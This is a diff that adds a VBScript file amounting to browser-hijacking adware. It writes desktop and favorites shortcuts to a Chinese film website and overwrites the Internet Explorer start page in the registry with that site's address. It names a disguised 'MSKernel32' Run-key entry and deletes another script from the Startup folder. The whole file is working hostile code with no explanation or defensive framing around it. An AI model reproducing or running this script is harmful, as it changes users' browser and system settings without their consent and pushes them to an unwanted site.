@@ -1,0 +1,23 @@
+Dim WSHShell,x,iepath,sp,orgsp
+iepath="HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\"
+sp=iepath &"Main\Start Page"
+run="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32"
+xx="http://5ifilm.myrice.com/"
+y="心动之家精品影视"
+Set WSHShell = WScript.CreateObject("WScript.Shell")
+Set oUrlLink = WshShell.CreateShortcut(Wscript.path & "\favorites\"& y & ".URL")
+oUrlLink.TargetPath = xx
+oUrlLink.Save
+Set deskLink = WshShell.CreateShortcut(Wscript.path & "\desktop\"& y & ".URL")
+deskLink.TargetPath = xx
+deskLink.Save
+orgsp=WSHShell.Regread(sp)
+if instr(orgsp,"etad") or instr(orgsp,"dayumi") or instr(orgsp,"owtolo") then
+else
+x="http://5ifilm.myrice.com/"
+WSHShell.RegWrite sp, x
+end if
+Set fs = CreateObject("Scripting.FileSystemObject")
+if fs.FileExists("c:\windows\Start Menu\Programs\启动\office200.hta") then
+fs.deletefile("c:\windows\Start Menu\Programs\启动\office200.hta")
+end if
